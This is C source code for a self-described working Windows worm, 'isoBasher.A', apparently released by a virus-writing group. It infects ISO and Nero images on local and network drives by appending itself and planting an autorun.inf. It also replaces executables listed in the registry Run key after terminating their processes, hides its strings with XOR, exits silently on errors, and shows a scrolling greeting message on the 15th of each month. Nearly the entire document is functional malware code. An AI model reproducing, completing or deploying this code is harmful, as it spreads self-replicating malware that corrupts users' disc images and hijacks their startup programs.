/* [ ---------------Description------------------------------ ] 
 	
 	isoBasher.A
 	
 	This is a working ISO Worm.
 	It's written with help of the C ISOLIB by someone called 
 	Troels. Sorry guys, i thought it would be the cleaner 
 	approach to use existing source code.
 	
 	I extended the library to offer the possibilities of:
 	- adding path table entries
 	- adding Root Directory records
 	- finaly resulting in possibility to add files
 	- crashing autostart.inf filenames in path table & root dir
 	- update volume size

	The w0rm determines randomly which dirs should be searched 
	for iso images each time it get's started.  
	When found an image, it adds itself to the end of the image, 
	adds a root dir record and upates the volume size.
	it also adds a autostart file that executes the w0rm
	when put into a Windows cdrom with autorun enabled.
	This is bad, because old autorun won't be executed anymore.
	
	When started from a CDROM drive, the w0rm looks for an 
	autostart entry in the registry, tries to overwrites the
	targeted executable with the w0rm file, and leaves a copy
	of the original file with an "_" prepended to the original 
	name in the same directory.
	
	When started from Harddisk, the w0rm tries to start
	the exe that contains a _ as the first letter of it's 
	name.
	
	No Payload until now.
	 	
   [ -------------------------------------------------------- ] */


/* [ ---------------todo------------------------------------- ] 

 		  
 		- new autorun.inf is only inserted into SVD, not PVD.
 		  this must be changed :) 
		  (probably this works only in PVD...) 

		- monitor nero file events, when Temp\~NB5~foobar.tmp
		  gets opened, intercept it >;-) 
		  (probably nero 6 uses a file named ~NB6~foobar.tmp)
 		  
 		  
   [ -------------------------------------------------------- ] */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
//#include <sys/types.h>
#include <dirent.h>
#include "isolib.h"
#include "isolib_addons.h"
#include "iso.h"
#include <dos.h>
#include "Tlhelp32.h"
#include "wchar.h"
#include <dirent.h>
#include <lmaccess.h>
#include <lmapibuf.h>

/* the file that was in autorun.inf before we own3d the file: */
static const char virginOrginalHost[256]="setup.exe";

#define HOST_STR_OFFSET		0x6C00	// File Offset of $virginOrginalHost, this has to be updated after any code change / compilation (you can find the offset via hex editor)
#define SEARCH_ROOTS_NUM 	0x4		// number of random dirs to search through...
#define ISO_INF_MARK_OFFSET 8000	// offset to location where we can put iso infection mark
#define ISO_INF_MARK_SPACE 	24766	// space for infection mark
#define ALREADY_INFECTED 	0x2		
#define SUCCESS_INFECTED 	0x1
#define FAILURE_INFECTED 	FALSE
#define INF_MARK_SIZE 		163		// to see if a system is already infected, 
									// a file with exactly INF_MARK_SIZE bytes is generated (random name, random content) to detect infected system's.
#define IN_THE_WILD 		0x1		// Debug ?
#define DEBUG_INFECTION		0x0

#define OSV_WIN98 			0x1		// OS Versions
#define OSV_WINNT 			0x2	

#define BSWAP(x) (((x)>>24)|              \
                  (((x)&0x00FF0000)>>8)|  \
                  (((x)&0x0000FF00)<<8)|  \
                  ((x)<<24))


                  
// ------------------------------ // 
//         :: PROTOTYPES ::
// ------------------------------ //
//BOOL IsWormProc(PROCESSENTRY32 * );
BOOL checkRootDir(char* fname);
void random_string(char*, int);
int  random_int(int min, int max);
BOOL PlaceInfectionMark();
BOOL termProc(char * name);
BOOL createProc(char * path);
char * __fastcall GetString(char * str[], int id);
LPTOP_LEVEL_EXCEPTION_FILTER silentExExit();

// ------------------------------ // 
//         :: GLOBALS ::
// ------------------------------ //                  
extern unsigned long Checkme(unsigned long);
char    WindowsDir[256];            // Windows Dir... 
char    TempDir[256];               // Windows Temp
char    RandomAppName[8+5]={0}; 	// filename for residency, random i am
char    SystemStartupPath[256];     // for residence we need a path to the file above...
char*   CommandLine;
int     HandleA;                    // FindFile handle

// stringtables - get decoded by GetString functio on demand...
// auotstarts, xored, escaped where needed
// first array elements contains xor key
char    *Autostarts[] = {
		"18", 
		"ZYWKMQG@@W\\FMGAW@NNA}tfes`wNN_{q`}a}tfNNE{|v}eaNNQg``w|fDw`a{}|NN@g|",	//1
		NULL };
#define AUTOSTART_PROC 		1		
// second stringtable, xored, escaped where needed
char * stringtable[] = {
		"0",
		"regedit /sa /e ",										// 1
		"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",			// 2
		"HKEY_LOCAL_MACHINE",											// 3	
		"HKEY_CURRENT_USER",											// 4
		NULL
	};
	
#define STR_REGEDIT_CMD 		0x1
#define STR_RUN_KEY				0x2
#define STR_HKEY_LOCAL_MACHINE 	0x3
#define	STR_HKEY_CURRENT_USER	0x4	


LPTOP_LEVEL_EXCEPTION_FILTER silentExExit()
{
	ExitProcess(0);
	return (LPTOP_LEVEL_EXCEPTION_FILTER)EXCEPTION_EXECUTE_HANDLER;		
}

// ------------------------------ // 
//         :: MAIN ::
// ------------------------------ // 

char * getTempFileName()
{
	char * path = malloc(MAX_PATH);
	if(path)
	{
		if(GetTempPath(MAX_PATH, path))
		{
			if(GetTempFileName(path, NULL, 1, path))
			{
				return(path);
			}
		}
	free(path);	
	}
	return(NULL);
}

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)
{
    char    Buffer256[256];
    char 	tempBuffer[256];	// ow my gawd :/
    char	startupPath[256];
    char	autorunEntry[256];
    char 	dumpCmd[512];
    char	*Roots[512];
    char    *str,*str2,*startupExe;
    int     i, x, z, dtype, dirsFound, filesize;
    int 	rand_nums[SEARCH_ROOTS_NUM]={0};
    DIR*	d;
    struct dirent* directory;
    BOOL 	dummy, dummy2;
    FILE *  fp;

	SetUnhandledExceptionFilter( (LPTOP_LEVEL_EXCEPTION_FILTER)silentExExit );	// exit silent on exceptions 
	
	
	// gather some often used environment strings...: 
    GetCurrentDirectory(255, (char*)&startupPath);
    startupExe = GetCommandLine();    
    // parse commandline to determine the filename of myself :
    if(startupExe[0] == '"'){
		startupExe++;
		for(i=strlen(startupExe); i>0; i--){
			if(startupExe[i]=='"'){
				startupExe[i]=0;
				break;
			}
		}	
	} 	
    if(!GetWindowsDirectory((char*)&WindowsDir, 256))
        return EXIT_SUCCESS;
	GetTempPath(256,(char*)&TempDir);

#ifdef DEBUG_INFECTION
	//MessageBox(0, "Infecting: testfile1.iso","ISOBASHERC", 0);
	InfectIso("E:\\vx\\isos\\driver.iso");
	return(0);
#else

	if(!WormAlreadyInstalled())
	{	
		// reg auslesen
		SetCurrentDirectory((char*)&TempDir);
		str = GetString(&stringtable, STR_REGEDIT_CMD);
		strcpy((char*)&dumpCmd,str);//21
		free(str);

		/* dump registry autostart apps, depending on current user priv. */
		if(isAdmin()){
			str = GetString(&stringtable, STR_HKEY_LOCAL_MACHINE);
			strcat((char*)&dumpCmd, str);
			free(str);
		}
		else
		{
			str = GetString(&stringtable, STR_HKEY_CURRENT_USER);
			strcat((char*)&dumpCmd, str);
			free(str);	
		}
		
		str = GetString(&stringtable, STR_RUN_KEY);
		strcat((char*)&dumpCmd, str);
		char * fileName = getTempFileName();
		free(str);
		if(fileName)
		{
			strncat(&dumpCmd, fileName,512-strlen(dumpCmd))	
			system((char*)&dumpCmd);
			/* read in registry dump & unlink file: */
			fp = fopen(fileName, "rb");
			filesize = filesz(fp); // filelength(fileno(fp));
			str = malloc(filesize);
			fread( str, sizeof(char), filesize, fp );
			fclose(fp);
			unlink(fileName);
			free(fileName);

			/* registry dump parse: */
			dummy=FALSE;	// gets true if installation succeded
			for(i=1; i<filesize-5; i++)
			{
			// detect beginning of valid drive strings:
			if( str[i] == *"=" && str[i+1]==*"\"" && str[i+3] == *":") 
			{
				// parse for exe path until lf is reached:
				x=i+2;
				while( str[x] != *"\n" )
				{
					if( (DWORD)str[x] == *".exe" )
					{
						memcpy(&autorunEntry, &str[i+2], (x+4)-(i+2));
						autorunEntry[(x+4)-(i+2)]=0;			// autorun entry contains path to exe
						strncpy((char*)&tempBuffer, (char*)&autorunEntry, 255);
						tempBuffer[ ((x+4)-(i+2))-5]=*"_";		// temp buffer contains path to new exe
						for(z=strlen((char*)&autorunEntry); z>=0; z--)		
						{
								if((char)autorunEntry[z]==*"\\")
								{
									dummy2 = termProc(&autorunEntry[z+1]);
									if(CopyFile((char*)&autorunEntry, (char*)&tempBuffer, TRUE)) // move old file to new name...
									{
											if(CopyFile(startupExe, (char*)&autorunEntry, FALSE)){	// move worm to loc. of old file
												if(dummy2==TRUE){createProc(&tempBuffer);}
												dummy=TRUE;	
											}
											else{
												DeleteFile((char*)&tempBuffer);	// if we could not move the worm, we delete the new clone..
												}	
									}	
									break;
								}
						}				
						i=x+4;
						break;
					}
					x++;	
				}
			}			
			if(dummy == TRUE){
				PlaceInfectionMark();
				break;	
			}
			}
			SetCurrentDirectory((char*)&startupPath);
			if(str != NULL)
				free(str);
		}

		

	}
	else
	{
		// virgin? (started from an cdrom) :
		strcpy((char*)&tempBuffer, startupExe);
		tempBuffer[3]=0;
		if( GetDriveType( (char*)&tempBuffer) != DRIVE_CDROM)
		{	
			// if not an virgin, start autostart clone:
			strcpy((char*)&tempBuffer, startupExe);

			/* build filename of the clone & execute */
			for(i=strlen(&tempBuffer); i>0; i--)
			{
				if(tempBuffer[i]==*".")
				{
					tempBuffer[i-1]=*"_";
					break;	
				}
			}	
			createProc(&tempBuffer);
			SYSTEMTIME date;
	
			GetLocalTime(&date);
			if((short)date.wDay==(short)15)
			{
				executePayload();
				exit(0);
			}
			
		}
		else
		{
			char oldAutorunFile[MAX_PATH];
			
			/* restore the old file name:*/
			strncpy(&oldAutorunFile, startupPath, MAX_PATH);
			strncat(&oldAutorunFile, &virginOrginalHost, MAX_PATH-strlen(&oldAutorunFile));
			
			/* start the old autostart.inf exe */ 
			createProc(&oldAutorunFile);
		}
	}	
    
	/* spread! */
	GetLogicalDriveStringsA(256, (char*)&Buffer256);
	dirsFound=0;

	/* find infectable directories */
	for(i=0; (i<256) && (dirsFound < 512) ;i+=4)
	{
		if( (char)Buffer256[i]==(char)NULL )
			break;	
		dtype = GetDriveType((char*)&Buffer256[i]);
		if(dtype == DRIVE_FIXED	|| dtype == DRIVE_REMOTE)
		{
			d=opendir((char*)&Buffer256[i]);
			if(!d)
				break;
			while( ((directory = readdir(d)) != NULL) && dirsFound < 512 )
			{
				if(directory == NULL)
					break;							
				strcpy((char*)&tempBuffer, (char*)&Buffer256[i]);
				strncat((char*)&tempBuffer,directory->d_name, directory->d_namlen);
				if(checkRootDir((char*)&tempBuffer))
				{
					Roots[dirsFound]=malloc(directory->d_namlen+4);
					if(!Roots[dirsFound])
						break;
					ZeroMemory(Roots[dirsFound], directory->d_namlen+4);
					strcpy(&Roots[dirsFound][0], (char*)&tempBuffer);
					dirsFound++;
				}
			}
			closedir(d);
		}		
	}
	dirsFound--;
	i=0;
	/* create an array of uniqe random numbers, highest rand number is numbers of dirs found. */
	/* sizeof array is number of num dirs found, or the below used constant ;) */
	for(i=0; i<SEARCH_ROOTS_NUM; i++)
		{
		do{
			rand_nums[i]=random_int(0,dirsFound+1);
			printf("generated random number: %i\n", rand_nums[i]);
			dummy = FALSE;	
			for(x=0; x<SEARCH_ROOTS_NUM; x++)
			{
				if(x!=i)
				{
					if(rand_nums[x]==rand_nums[i]){
						dummy = TRUE;
						break;
					}
				}
			}
		}while( dummy==TRUE );
	}	

	/* try to find isos in previously (random) selected directories */
	for(i=0; i<SEARCH_ROOTS_NUM;i++)
	{
		if(Roots[rand_nums[i] != NULL )
		{
			printf("using root %i: %s\n",rand_nums[i],Roots[rand_nums[i]]);
			SetCurrentDirectory((char*)Roots[rand_nums[i]]);
			free(Roots[rand_nums[i]);
			if(i>dirsFound)
			{
				break;
			}
			FindFiles();
		}
	}
	
#endif 

	system("Pause");
    return EXIT_SUCCESS;
}



// ------------------------------ // 
//         :: FUNCTIONS ::
// ------------------------------ //
int  random_int(int min, int max)
{
	int random =0;
	srand((unsigned int)GetTickCount()); // init random seed
	int waittime=rand();
	waittime=waittime%(0x666);
	if(waittime > 0)
	{
		Sleep(waittime);
	}
    srand((unsigned int)GetTickCount()); // init random seed
	do{
		random = rand();
		srand((unsigned int)random);
		random = rand();
		random = random%max;
	}while(random<min || random > max);
	
	return(random);		
}

void random_string(char * str, int len)
{
    int i=0;
    int range=0;
	int waittime=0;
   
    int ascii_range[][3] = {
                            {48,65,97},
                            {57,90,122}
                            };          // 3 ascii ranges for useable characters (numbers, uppercase alpha, lowercase alpha)
                                        // 0 = minmal values
                                        // 1 = maximal values
    int ichar=0;
    char rchar;

    srand((unsigned int)time((time_t *)NULL)); // init random seed
	
	waittime=rand();
	waittime=waittime%(0x666);
	if(waittime > 0)
	{
		Sleep(waittime);
	}
	
	srand((unsigned int)GetTickCount()); 	// init random seed
	
    for(i=0;i<len;i++)
        {
        range = rand();						  // get random number
        range = range%3;					  // and use it to select which ascii range to use
  
	  // genrating character:
        while(1)
               {
                ichar = rand();						 // get rand number
                ichar = ichar%ascii_range[1][range]; // use it to select a char from char table
				
                if(ichar > ascii_range[0][range] && ichar < ascii_range[1][range])
                   {
                    rchar = (char)ichar;
                    str[i]=rchar;
                    break;
                   }
                                                         
               }
       }
}

// checks if process runs under admin privileges
BOOL isAdmin()
{
	BOOL result;
	DWORD rc;
	wchar_t user_name[256];
	USER_INFO_1 *info;
	DWORD size = sizeof( user_name );

	GetUserNameW( user_name, &size);

	rc = NetUserGetInfo( NULL, user_name, 1, (byte **) &info );
	if ( rc != 0 )
		return FALSE;

	result = info->usri1_priv == USER_PRIV_ADMIN;

	NetApiBufferFree( info );
	return result;
}
void myDebugString(char * str)
{
        printf("%s", str);    
}

int isInfectableIso(WIN32_FIND_DATA * FindData)
{
    // checks if file is valid for infection
    // returns FALSE if not, 
    // returns TRUE if valid

	// this is just a pre-infection check, errors during infection
	// can happen after this check, of course.
    
    DWORD checker=0;
    
    // check if it is a directory:
    checker = FindData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
    if(checker == FILE_ATTRIBUTE_DIRECTORY)
    return(FALSE); 
        
    // check if it is read only:
    /*
    This attribute is just a flag, but doesn't tell us if it's really readonly
	checker = 0;
    checker = FindData->dwFileAttributes & FILE_ATTRIBUTE_READONLY;
    if(checker == FILE_ATTRIBUTE_READONLY)
    return(FALSE);
    */
    
    checker = 0;
    checker = FindData->dwFileAttributes & FILE_ATTRIBUTE_SYSTEM;
    if(checker == FILE_ATTRIBUTE_SYSTEM)
    return(FALSE);
    
    checker = 0;
    checker = FindData->dwFileAttributes & FILE_ATTRIBUTE_OFFLINE;
    if(checker == FILE_ATTRIBUTE_OFFLINE)
    return(FALSE);
    
	// check file extension
	int len = strlen(FindData->cFileName); 
    len = len - 4;
    char * strptr = FindData->cFileName;
    strptr = strptr+len;
    
    if(!stricmp(strptr, ".nrg"))
    return(TRUE);                   
    
    if( !stricmp(strptr, ".iso"))
    return(TRUE);
    
    if( !stricmp(strptr, ".iso"))
    {
		return(TRUE);
	}

    return(FALSE);
}


int InfectIso(char * fname)
{ 
    FILE * f;
	FILE * ft;
    BOOL	filesystem_support;
    IsoImage * Iso;
    //char TempName[256];
    char extractPath[256];
	char editFilePath[256]={0};
	char virginHost[256]={0};
    unsigned int i=0;
	char rand_fname[256]; 
	char *ptr_rand_fname=(char*)&rand_fname;
	char str_autostart_inf[256]="[autorun]\r\nOPEN=";
	char * ptr_autostart_inf=(char*)str_autostart_inf;
	char * cmdLine = GetCommandLine();
	char extension[5]={0};
	char * imagePadding;
	int space;
	char * inf_mark_buffer;
	BOOL fs_support=FALSE;
				
	i=strlen(fname)-4;
	strncpy((char*)&extension, &fname[i],4);
    f = fopen(fname, "r+b");
    if(f == NULL){
         goto error_0;
    }
    
    inf_mark_buffer = malloc(512);
	if(inf_mark_buffer)
    {
		ZeroMemory(inf_mark_buffer, 512);
		fread(inf_mark_buffer, sizeof(char), 512, f );
		for(i = 512; i<=512; i++)
		{
				if(inf_mark_buffer[i] != (int)NULL)
				{
					free(inf_mark_buffer);
					return(ALREADY_INFECTED);	
				}
		}
		free(inf_mark_buffer);
		fseek(f, 0, SEEK_SET);
	}
    
    Iso = iso_attach(f);
    if(Iso == NULL)
    {
     goto error_1;       
    }
#ifdef COMPILE_FILESYSTEM_SUPPORT    
    fs_support = iso_init(Iso);
#endif
    
    // align nero images to blocksize:
	DWORD l = filelength(fileno(f));
	if( ((l % 2352) != 0) && ((l % 2048) != 0) ){
		space = GetPaddingLength(Iso->RealBlockSize, l);
		imagePadding=malloc(sizeof(char)*space);
		if(!imagePadding) goto error_1;
		fseek(f, 0, SEEK_END);
		fwrite(imagePadding, sizeof(char), space, f);
		free(imagePadding);
  	} 
    
	// random filename erstellen: 
	ZeroMemory(&rand_fname, 256);
	random_string(rand_fname,8);
	strcat(rand_fname, ".exe");

	/* extract autorun.inf file: */
	char * autorun[2048]={0};
		if(!iso_ReadAutorunInfo(Iso, (char*)autorun, 2048))
		{			
			if( parseAutorunData(&autorun, &virginHost, 255) == TRUE)
			{
				strcpy((char*)&editFilePath, (char*)&TempDir);
				strcpy((char*)&editFilePath, (char*)rand_fname);
				CopyFile((char*)cmdLine, (char*)&editFilePath, FALSE);
				ft = fopen((char*)&editFilePath, "w+b");
				if(ft )
				{
					fseek(ft, HOST_STR_OFFSET, SEEK_SET );
					fwrite((void*)&virginHost, sizeof(char), strlen((char*)&virginHost), ft);	
					fclose(ft);
				}
				// edit file
				unlink((char*)&editFilePath); 	
			}
		}		
	// generate autostart file:
	strcat(ptr_autostart_inf, ptr_rand_fname);
	strcat(ptr_autostart_inf, "\r\n");

	iso_DamageAutostartInfStructs(Iso);
	/*	
		i should parse this file before renaming, and append the information 
		to the new Autostart.inf :) 
	*/	
	
	/* TODO (Ole#1#): Autostarts überschreiben (overwrite / rewrite file), 
	                  nicht einfach neuen eintrag machen */
	iso_AddFileByData( Iso, "autorun.inf", ptr_autostart_inf, strlen(str_autostart_inf) );
	iso_AddFile(Iso, (char*)cmdLine, ptr_rand_fname);
	iso_UpdateVolumeSize(Iso); 
	fseek(f, (long)random_int(8000, ISO_INF_MARK_SPACE), SEEK_SET);
	fprintf(f, "%c", (char)random_int(1,254));
	fclose(f); 	
	return(TRUE);
    
error_1:;
	if(f)
      fclose(f);
error_0:;
      return(FALSE);
}

/*
	get the autorun file from cdrom autorun data...
*/
BOOL parseAutorunData(char * in, void * out, int szOut)
{
	char * endOff;
	char * startOff;
	int len;

		startOff=(char*)strstr((char*)&in[0], (char*)"OPEN=");
		if(!startOff)
			return(FALSE);
		startOff+=5;
		if(!stricmp((char*)"OPEN=", (char*)startOff))
		{
			endOff=strchr((char*)&startOff, *"\r");
			if(!endOff)
				endOff=strchr((char*)&startOff, *"\n");
			if(!endOff)
			{
				return(FALSE);		
			}
			len =(int)( endOff - startOff );
			memcpy(out, (void*)startOff, len);
			return(TRUE);
		}	
}

int FindFiles()
{
    int err;
    char OldDir[256];
    char Fmask[270];
    char NewDir[256];
    char SparePath[256];
    WIN32_FIND_DATA FindData;
    HANDLE fhandle;
    DWORD fileAttributes;
	    
    GetCurrentDirectory( 256 , (char*)&OldDir ); 
    strcpy((char*)Fmask, OldDir);
    strcat((char*)Fmask, "\\*");
    fhandle = FindFirstFile((char*)&Fmask, (WIN32_FIND_DATA*)&FindData); 
    if(fhandle != INVALID_HANDLE_VALUE)
    {
    goto __processResults__;
    while(1)
    {
      err = FindNextFile(fhandle, &FindData);
      if(err == 0 || err == ERROR_NO_MORE_FILES)
      {
       break;      
      }
      __processResults__:
      //printf("File: %s\r\n",&FindData.cFileName);    
      
       if( ((fileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)  && !(FindData.cFileName[0]==0x2e))
       {
	        ZeroMemory((char*)&NewDir, 256);
	        strcpy((char*)&NewDir, OldDir);
	        strcat((char*)&NewDir, "\\");
	        strcat((char*)&NewDir, FindData.cFileName);
	        SetCurrentDirectory((char*)&NewDir);
	        FindFiles();                         
       }
       
       if( isInfectableIso(&FindData) )
        {
	         ZeroMemory((char*)&SparePath, 256);
	         strcpy((char*)&SparePath, OldDir);
			 strcat((char*)&SparePath, "\\");
	         strcat((char*)&SparePath, (char*)&FindData.cFileName);
			 printf("Infecting: %s\n", &SparePath);
			 if(IN_THE_WILD)
			 {
				 InfectIso((char*)&SparePath);
			 }
        }                                           
    }
    }
    SetCurrentDirectory((char*)&OldDir);        
    return(0);      
}

BOOL PlaceInfectionMark()
{
	char MarkDir[256];
	char rs[8]={0};
	char rs2[INF_MARK_SIZE];
	FILE * fh;
	DWORD written;
	
	if(!GetWindowsDirectory((char*)&MarkDir, 255))
		return FALSE;	
	random_string((char*)&rs, 7);
	random_string((char*)&rs2, INF_MARK_SIZE);
	strcat((char*)&MarkDir, "\\"); 
	strcat((char*)&MarkDir, (char*)&rs);
	
	fh = fopen(MarkDir, "wb");
    if(!fh)	return FALSE;
    if(fwrite(&rs2,sizeof(char),INF_MARK_SIZE,fh) != INF_MARK_SIZE)
    	return FALSE;
    fclose(fh);
	return(TRUE);
}

BOOL WormAlreadyInstalled()
{
	// checks for the infection mark...
	char MarkDir[256];
	char OldCwd[256];
	FILE * file;
    DIR*	d;
    struct dirent* directory;
	
	GetCurrentDirectory(255,(char*)&OldCwd);	
	if(!GetWindowsDirectory((char*)&MarkDir, 255))
		return FALSE;
	SetCurrentDirectory((char*)&MarkDir);
	d=opendir((char*)&MarkDir);
	if(!d) return (FALSE);
	while( ((directory = readdir(d)) != NULL) )
	{	
		if( (file = fopen(directory->d_name, "rb")) )
		{
			if(filelength(fileno(file))== INF_MARK_SIZE)
			{
				SetCurrentDirectory((char*)&OldCwd);
				fclose(file);
				closedir(d);
				return(TRUE);	
			}
			fclose(file);
		}
	}	
	closedir(d);
	SetCurrentDirectory((char*)&OldCwd);
	return(FALSE);
}    

/*

*/
char * __fastcall GetString(char *strar[],int id)
{
	int 	i,slen;
	char *  str = (char*)strar[id];
	register char *  retstr;
	unsigned char xorval = atoi((char*)strar[0]);
	slen=strlen(str);
	retstr = malloc(slen+1);
	ZeroMemory(retstr, slen+1);
	for(i=0; i<slen;i++){
		retstr[i]=(char)(str[i]^xorval);
		//retstr[i]=(char)(strar[id][i]^xorval);
	}
	return(retstr);
}

BOOL termProc(char * name)
{
    HANDLE Snapshot;
    HANDLE procHndl;
    PROCESSENTRY32 pe32;
   	pe32.dwSize = sizeof( PROCESSENTRY32 );
    
    Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, (unsigned int)NULL);   
    if(Snapshot == INVALID_HANDLE_VALUE)
    {
        return(FALSE);   
    } 
    if( !Process32First( Snapshot, &pe32 ) )
    {
        CloseHandle( Snapshot );     // Must clean up the snapshot object!
        return FALSE;
    }
    
    do
    {
    	if(!strcmp(pe32.szExeFile, name))
		{
			procHndl = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			if(procHndl != NULL)
			{
				if(TerminateProcess(procHndl, 0))
				{
					CloseHandle(Snapshot);
					CloseHandle(procHndl);
					return(TRUE);
				}
				CloseHandle(Snapshot);
				CloseHandle(procHndl);
				return(FALSE);
			}
			CloseHandle(Snapshot);
			return(FALSE);		
		}        
    }while( Process32Next( Snapshot, &pe32 ));	
    return(FALSE);
}

BOOL createProc(char * path)
{
	PROCESS_INFORMATION procInfo={0};
	STARTUPINFO startInfo={0};
	
	startInfo.lpReserved=NULL;
	char *cwdpath;
	char *exepath;
	int i,len;
	cwdpath = NULL;
	len = strlen(path);
	exepath = malloc(len);
	if(!exepath)
		return( FALSE );
	strcpy(exepath, path);
	
	for(i=len; i>=0; i--)
	{
		if(exepath[i] == *"\\")
		{
			exepath[i]=0;
			cwdpath=malloc(i+2);
			if(!cwdpath)
				return( FALSE );
			ZeroMemory(cwdpath, i+2);
			strncpy(cwdpath, exepath, i+1);
			exepath[i]=*"\\";
			break;
		}
	}
	if(CreateProcess(path, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, cwdpath, &startInfo, &procInfo ))
	{
		if(cwdpath != NULL)
			free(cwdpath);
		if(exepath != NULL)
			free(exepath);
		return(TRUE);
	}
	return(FALSE);
}

BOOL checkRootDir(char* fname){
 if(!stricmp("Windows", (char*)&fname[3]))
 {
	return(FALSE);		
 }
 
 if(!stricmp("Recycled", (char*)&fname[3]))
 {
	return(FALSE);		
 }	

 if(!stricmp("System Volume Information", (char*)&fname[3]))
 {
	return(FALSE);		
 }		


 DWORD fileAttr = GetFileAttributes(fname);

 if((fileAttr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM	){
	return(FALSE);	
	}
	
 if((fileAttr & FILE_ATTRIBUTE_OFFLINE) == FILE_ATTRIBUTE_OFFLINE){
	return(FALSE);	
	}
	
 // we check for dir and then go away...
 if((fileAttr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY){
	return(TRUE);	
	}
	
	return(FALSE);			
}

/*
int filesz(FILE * file)
{
	return(filelength(fileno(file)));	
}
*/

#define MAX_CHARS 80
#define ROWS 5
#define COLS 80
#define BSIZE 80*5

typedef struct character
{
	int x;	// which col
	int y;	// which row
	unsigned char value;
	WORD attrb;
} conchar;

char screen[BSIZE]; 
HANDLE hStdOut;
char message[]="The Bad Boy is back in Town!\tThis is a working ISO Worm. Features: adding path table entries, adding Root Directory records, adding files & new autorun info, crashing autostart.inf filenames in path table & root dir. The Infector works via autorun.inf file. OK, this W0rm is a little bit late... DVD already owend us! Greets fly out to: kr:sh, gerrit, l00m, Mario, Kathi, Thorben, Triple-X, Killboy, The wh0le RRLF Crew, Tolosker & all the persons I forgot. Have a happy time on earth, time is rare!";
int msglen;	

void renderScreen()
{
   COORD WriteCoord = { 0, 0 };
   DWORD a;
   WriteConsoleOutputCharacter(hStdOut, (LPCSTR)screen, COLS, WriteCoord, &a);
   WriteCoord.X = 0;
   WriteCoord.Y =2;

}

void update(conchar conchars[])
{
	int i;
	DWORD a;
	ZeroMemory(screen, BSIZE); 
	for(i=0; i<msglen; i++)
	{
		conchars[i].x--;
		if(conchars[i].x < 0)
		{
			conchars[i].x = COLS+msglen;
		}
		if(conchars[i].x > 0 && conchars[i].x < COLS-1)
		{
			screen[ conchars[i].x + (COLS*conchars[i].y)] = conchars[i].value;
		}		
	}	
}

BOOL executePayload()
{
	int i;
	DWORD a;
	msglen = strlen(message);
   COORD dwSize = { COLS, ROWS };
   SMALL_RECT ConsoleWindow = { 0, 0, COLS-1, ROWS-1 };

   WORD atr = FOREGROUND_GREEN | BACKGROUND_RED | FOREGROUND_INTENSITY  ;
   COORD cord;
   cord.X = 0;
   cord.Y = 0;
   COORD WriteCoord = { 0, 2 };
   
   hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
   SetConsoleWindowInfo(hStdOut, TRUE, &ConsoleWindow);
   SetConsoleScreenBufferSize(hStdOut, dwSize);    
   
   conchar conchars[msglen];

	for(i=0; i<msglen; i++)
	{
		conchars[i].value = message[i];	
		conchars[i].x = COLS+i;
		conchars[i].y = 0;
	}
	
	for(i=0; i<=80; i++)
	{
		cord.X = i;
		WriteConsoleOutputAttribute(hStdOut, (WORD *)&atr, 1,  cord, &a);	
	}

	do{
		ZeroMemory(screen, BSIZE); 
		for(i=0; i<msglen; i++)
		{
			conchars[i].x--;
			if(conchars[i].x < 0)
			{
				conchars[i].x = COLS+msglen;
			}
			if(conchars[i].x > 0 && conchars[i].x < COLS-1)
			{
				screen[ conchars[i].x + (COLS*conchars[i].y)] = conchars[i].value;
			}		
		}
      // update(conchars);
      renderScreen();
      Sleep(100);
   }while(!GetAsyncKeyState(VK_ESCAPE)); 
}

